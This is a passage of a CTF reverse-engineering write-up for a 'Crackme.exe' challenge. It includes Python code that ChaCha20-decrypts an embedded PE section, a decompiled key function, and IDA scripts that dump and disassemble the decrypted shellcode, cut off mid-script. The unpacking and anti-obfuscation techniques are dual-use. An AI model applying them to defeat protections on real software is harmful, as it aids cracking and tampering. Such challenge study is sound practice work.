x[a]; x[d] = rotl32(x[d], <span class="number">16</span>)</span><br><span class="line">    x[c] = (x[c] + x[d]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    x[b] ^= x[c]; x[b] = rotl32(x[b], <span class="number">12</span>)</span><br><span class="line">    x[a] = (x[a] + x[b]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    x[d] ^= x[a]; x[d] = rotl32(x[d], <span class="number">8</span>)</span><br><span class="line">    x[c] = (x[c] + x[d]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    x[b] ^= x[c]; x[b] = rotl32(x[b], <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chacha20_block</span>(<span class="params">state16_words</span>):</span><br><span class="line">    x = state16_words[:]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        quarter_round(x, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>)</span><br><span class="line">        quarter_round(x, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>)</span><br><span class="line">        quarter_round(x, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>)</span><br><span class="line">        quarter_round(x, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>)</span><br><span class="line">        quarter_round(x, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>)</span><br><span class="line">        quarter_round(x, <span class="number">1</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">12</span>)</span><br><span class="line">        quarter_round(x, <span class="number">2</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">13</span>)</span><br><span class="line">        quarter_round(x, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">14</span>)</span><br><span class="line">    out = [(x[i] + state16_words[i]) &amp; <span class="number">0xFFFFFFFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span>.join(struct.pack(<span class="string">&quot;&lt;I&quot;</span>, w) <span class="keyword">for</span> w <span class="keyword">in</span> out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chacha20_xor</span>(<span class="params">data_bytes, consts4, key8, nonce2, counter0=<span class="number">0</span>, counter1=<span class="number">0</span></span>):</span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    c0, c1 = counter0 &amp; <span class="number">0xFFFFFFFF</span>, counter1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> bi <span class="keyword">in</span> <span class="built_in">range</span>((<span class="built_in">len</span>(data_bytes) + <span class="number">63</span>) // <span class="number">64</span>):</span><br><span class="line">        state = consts4 + key8 + [c0, c1] + nonce2</span><br><span class="line">        ks = chacha20_block(state)</span><br><span class="line">        chunk = data_bytes[bi * <span class="number">64</span>:(bi + <span class="number">1</span>) * <span class="number">64</span>]</span><br><span class="line">        out.extend(<span class="built_in">bytes</span>(chunk[i] ^ ks[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chunk))))</span><br><span class="line">        c0 = (c0 + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">if</span> c0 == <span class="number">0</span>: c1 = (c1 + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_section</span>(<span class="params">pe_path: Path, sec_name: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    pe = pe_path.read_bytes()</span><br><span class="line">    <span class="keyword">if</span> pe[:<span class="number">2</span>] != <span class="string">b&quot;MZ&quot;</span>: <span class="keyword">raise</span> ValueError(<span class="string">&quot;Not an MZ executable&quot;</span>)</span><br><span class="line">    e_lfanew = struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, pe, <span class="number">0x3C</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> pe[e_lfanew:e_lfanew+<span class="number">4</span>] != <span class="string">b&quot;PE\0\0&quot;</span>: <span class="keyword">raise</span> ValueError(<span class="string">&quot;Not a PE file&quot;</span>)</span><br><span class="line">    coff = e_lfanew + <span class="number">4</span></span><br><span class="line">    num_sections = struct.unpack_from(<span class="string">&quot;&lt;H&quot;</span>, pe, coff + <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    opt_size = struct.unpack_from(<span class="string">&quot;&lt;H&quot;</span>, pe, coff + <span class="number">16</span>)[<span class="number">0</span>]</span><br><span class="line">    sec_off = coff + <span class="number">20</span> + opt_size</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_sections):</span><br><span class="line">        off = sec_off + i * <span class="number">40</span></span><br><span class="line">        name = pe[off:off+<span class="number">8</span>].split(<span class="string">b&quot;\0&quot;</span>, <span class="number">1</span>)[<span class="number">0</span>].decode(<span class="string">&quot;ascii&quot;</span>, <span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">        vsize, vaddr, raw_size, raw_ptr = struct.unpack_from(<span class="string">&quot;&lt;IIII&quot;</span>, pe, off + <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> name == sec_name: <span class="keyword">return</span> pe[raw_ptr:raw_ptr + raw_size]</span><br><span class="line">    <span class="keyword">raise</span> KeyError(<span class="string">f&quot;Section <span class="subst">&#123;sec_name!r&#125;</span> not found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    consts = [<span class="number">0xB979379E</span>, <span class="number">0x157C4A7F</span>, <span class="number">0x60C09CF3</span>, <span class="number">0x34C8ED5C</span>]</span><br><span class="line">    key    = [<span class="number">0x38AA30F6</span>, <span class="number">0x379772D5</span>, <span class="number">0x5955645D</span>, <span class="number">0x50FD34C3</span>, <span class="number">0xD1A15CD5</span>, <span class="number">0x5A65D277</span>, <span class="number">0xCF512304</span>, <span class="number">0xF24B2469</span>]</span><br><span class="line">    counter = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    nonce  = [<span class="number">0x0D0C0B0A</span>, <span class="number">0x11100F0E</span>]</span><br><span class="line">    exe = Path(<span class="string">&quot;Crackme.exe&quot;</span>)</span><br><span class="line">    pc  = extract_section(exe, <span class="string">&quot;.pc&quot;</span>)</span><br><span class="line">    dec = chacha20_xor(pc, consts, key, nonce, counter0=counter[<span class="number">0</span>], counter1=counter[<span class="number">1</span>])</span><br><span class="line">    Path(<span class="string">&quot;pc_decrypted.bin&quot;</span>).write_bytes(dec)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] .pc size = <span class="subst">&#123;<span class="built_in">len</span>(pc)&#125;</span> bytes&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>However, the decrypted shellcode is full of junk codes and control flow flattening obfuscating, making it difficult to analyze.</p>
<p>To find the function after decrypt, after called <code>loc_40A000</code>, in <code>sub_40413B</code>:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __thiscall <span class="title">sub_40413B</span><span class="params">(<span class="type">void</span> *<span class="keyword">this</span>, <span class="type">int</span> a2, <span class="type">char</span> *Src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v3 = <span class="built_in">sub_403FBA</span>((<span class="type">int</span>)<span class="keyword">this</span>, Src);</span><br><span class="line">  <span class="built_in">sub_404684</span>((<span class="type">int</span>)&amp;a2, (<span class="type">int</span>)v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_4037FA</span>(&amp;a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The <code>v3</code> is the place of decrypted function. First function:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__fastcall <span class="title">sub_40A000</span><span class="params">(_DWORD *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  key[<span class="number">0</span>] = <span class="number">0x865DBB47</span>;</span><br><span class="line">  key[<span class="number">1</span>] = <span class="number">0x0A6EB190</span>;</span><br><span class="line">  key[<span class="number">2</span>] = <span class="number">0x20476C33</span>;</span><br><span class="line">  key[<span class="number">3</span>] = <span class="number">0x1C8A7693</span>;</span><br><span class="line">  key[<span class="number">4</span>] = <span class="number">0x59FEBDFB</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>returns 5 dwords (key). Debugging found that the program decrypts 16 bytes of encrypted bytecode each time, and then only executes one line of assembly code. The next decryption starts from the end of the previous assembly code. When set breakpoint at 0x404010 (before memcpy of decrypted code),  the code will store at *EBX. Dump the assembly code:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_dbg</span><br><span class="line"><span class="keyword">import</span> ida_kernwin</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"></span><br><span class="line">BREAK_EA        = <span class="number">0x00404010</span></span><br><span class="line">OUTPUT_PATH     = <span class="string">r&quot;E:\CTF\temp\dump.bin&quot;</span></span><br><span class="line">READ_SIZE       = <span class="number">0x10</span></span><br><span class="line">PAD_SIZE        = <span class="number">0x10</span></span><br><span class="line">g_hooks = <span class="literal">None</span></span><br><span class="line">g_fp = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_execute_sync</span>(<span class="params">fn</span>):</span><br><span class="line">    <span class="keyword">try</span>: ida_kernwin.execute_sync(fn, ida_kernwin.MFF_FAST)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">try</span>: fn()</span><br><span class="line">        <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_read_mem</span>(<span class="params">ea, size, tid=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bs = idaapi.dbg_read_memory(ea, size)</span><br><span class="line">        <span class="keyword">if</span> bs: <span class="keyword">return</span> <span class="built_in">bytes</span>(bs)</span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bs = ida_dbg.read_dbg_memory(ea, size)</span><br><span class="line">        <span class="keyword">if</span> bs: <span class="keyword">return</span> <span class="built_in">bytes</span>(bs)</span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> tid <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            bs = ida_dbg.read_dbg_memory(tid, ea, size)</span><br><span class="line">            <span class="keyword">if</span> bs: <span class="keyword">return</span> <span class="built_in">bytes</span>(bs)</span><br><span class="line">        <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        buf = <span class="built_in">bytearray</span>(size)</span><br><span class="line">        ok = ida_dbg.read_dbg_memory(ea, buf, size)</span><br><span class="line">        <span class="keyword">if</span> ok: <span class="keyword">return</span> <span class="built_in">bytes</span>(buf)</span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[dump] failed to read dbg memory @ 0x<span class="subst">&#123;ea:08X&#125;</span>, size=0x<span class="subst">&#123;size:X&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_dump_once</span>(<span class="params">tid=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">global</span> g_fp</span><br><span class="line">    <span class="keyword">try</span>: p = ida_dbg.get_reg_val(<span class="string">&quot;EBX&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[dump] get_reg_val(EBX) failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> p <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> p &lt; <span class="number">0x10000</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[dump] EBX=0x<span class="subst">&#123;<span class="number">0</span> <span class="keyword">if</span> p <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p:08X&#125;</span> looks invalid, skip&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    data = _read_mem(p, READ_SIZE, tid=tid)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[dump] failed to read <span class="subst">&#123;READ_SIZE&#125;</span> bytes @ EBX=0x<span class="subst">&#123;p:08X&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; READ_SIZE: data += <span class="string">b&quot;\x00&quot;</span> * (READ_SIZE - <span class="built_in">len</span>(data))</span><br><span class="line">    out = data + (<span class="string">b&quot;\x00&quot;</span> * PAD_SIZE)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        g_fp.write(out)</span><br><span class="line">        g_fp.flush()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[dump] hit 0x<span class="subst">&#123;BREAK_EA:08X&#125;</span> | EBX=0x<span class="subst">&#123;p:08X&#125;</span> | wrote <span class="subst">&#123;<span class="built_in">len</span>(out)&#125;</span> bytes&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e: <span class="built_in">print</span>(<span class="string">f&quot;[dump] file write error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_continue</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ida_dbg.continue_process()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ida_dbg.request_continue_process()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e: <span class="built_in">print</span>(<span class="string">f&quot;[dump] continue failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DumpHooks</span>(ida_dbg.DBG_Hooks):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dbg_bpt</span>(<span class="params">self, tid, ea</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> ea != BREAK_EA: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            _dump_once(tid=tid)</span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">_cont</span>(): _<span class="keyword">continue</span>()</span><br><span class="line">            _execute_sync(_cont)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[dump] dbg_bpt exception: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dbg_process_exit</span>(<span class="params">self, pid, tid, ea, exit_code</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[dump] process exit (code=<span class="subst">&#123;exit_code&#125;</span>), stopping.&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>: stop()</span><br><span class="line">        <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">global</span> g_hooks, g_fp</span><br><span class="line">    <span class="keyword">if</span> g_hooks <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[dump] already started&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    os.makedirs(os.path.dirname(OUTPUT_PATH), exist_ok=<span class="literal">True</span>)</span><br><span class="line">    g_fp = <span class="built_in">open</span>(OUTPUT_PATH, <span class="string">&quot;ab&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        idc.add_bpt(BREAK_EA)</span><br><span class="line">        idc.enable_bpt(BREAK_EA, <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">try</span>: ida_dbg.add_bpt(BREAK_EA)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[dump] add_bpt failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">    g_hooks = DumpHooks()</span><br><span class="line">    g_hooks.hook()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[dump] started.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  BREAK_EA = 0x<span class="subst">&#123;BREAK_EA:08X&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  OUTPUT   = <span class="subst">&#123;OUTPUT_PATH&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stop</span>():</span><br><span class="line">    <span class="keyword">global</span> g_hooks, g_fp</span><br><span class="line">    <span class="keyword">if</span> g_hooks <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>: g_hooks.unhook()</span><br><span class="line">        <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">        g_hooks = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>: idc.enable_bpt(BREAK_EA, <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> g_fp <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            g_fp.flush()</span><br><span class="line">            g_fp.close()</span><br><span class="line">        <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">        g_fp = <span class="literal">None</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[dump] stopped.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start()</span><br></pre></td></tr></table></figure>

<p>Disasm the shellcode:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> ida_funcs</span><br><span class="line"><span class="keyword">import</span> ida_lines</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"></span><br><span class="line">OUTPUT_PATH = <span class="string">r&quot;E:\CTF\temp\trace.txt&quot;</span></span><br><span class="line">STEP        = <span class="number">0x40</span></span><br><span class="line">TARGET_SEG_NAME = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pick_target_seg</span>():</span><br><span class="line">    <span class="keyword">if</span> TARGET_SEG_NAME:</span><br><span class="line">        seg = idaapi.get_segm_by_name(TARGET_SEG_NAME)</span><br><span class="line">        <span class="keyword">if</span> seg: <span class="keyword">return</span> seg</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[trace] segment &#x27;<span class="subst">&#123;TARGET_SEG_NAME&#125;</span>&#x27; not found, fallback to auto-pick&quot;</span>)</span><br><span class="line">    seg0 = idaapi.getseg(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> seg0: <span class="keyword">return</span> seg0</span><br><span class="line">    best = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> idautils.Segments():</span><br><span class="line">        seg = idaapi.getseg(s)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> seg: <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> best <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> seg.start_ea &lt; best.start_ea: best = seg</span><br><span class="line">    <span class="keyword">return</span> best</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">undefine_all</span>(<span class="params">seg_start, seg_end</span>):</span><br><span class="line">    funcs = <span class="built_in">list</span>(idautils.Functions(seg_start, seg_end))</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> funcs:</span><br><span class="line">        <span class="keyword">try</span>: ida_funcs.del_func(f)</span><br><span class="line">        <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    size = seg_end - seg_start</span><br><span class="line">    <span class="keyword">try</span>: ida_bytes.del_items(seg_start, ida_bytes.DELIT_EXPAND | ida_bytes.DELIT_SIMPLE, size)</span><br><span class="line">    <span class="keyword">except</span> Exception: ida_bytes.del_items(seg_start, ida_bytes.DELIT_SIMPLE, size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_code_and_get_line</span>(<span class="params">ea</span>):</span><br><span class="line">    <span class="keyword">try</span>: idc.create_insn(ea)</span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    line = idc.generate_disasm_line(ea, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">        <span class="keyword">try</span>: idaapi.auto_wait()</span><br><span class="line">        <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">        line = idc.generate_disasm_line(ea, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> line: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>: line = ida_lines.tag_remove(line)</span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> line.strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    seg = pick_target_seg()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> seg:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[trace] no segment found&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    seg_start = seg.start_ea</span><br><span class="line">    seg_end   = seg.end_ea</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[trace] target segment:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  name  = <span class="subst">&#123;idaapi.get_segm_name(seg)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  range = 0x<span class="subst">&#123;seg_start:08X&#125;</span> - 0x<span class="subst">&#123;seg_end:08X&#125;</span> (size=0x<span class="subst">&#123;seg_end-seg_start:X&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  step  = 0x<span class="subst">&#123;STEP:X&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  out   = <span class="subst">&#123;OUTPUT_PATH&#125;</span>&quot;</span>)</span><br><span class="line">    undefine_all(seg_start, 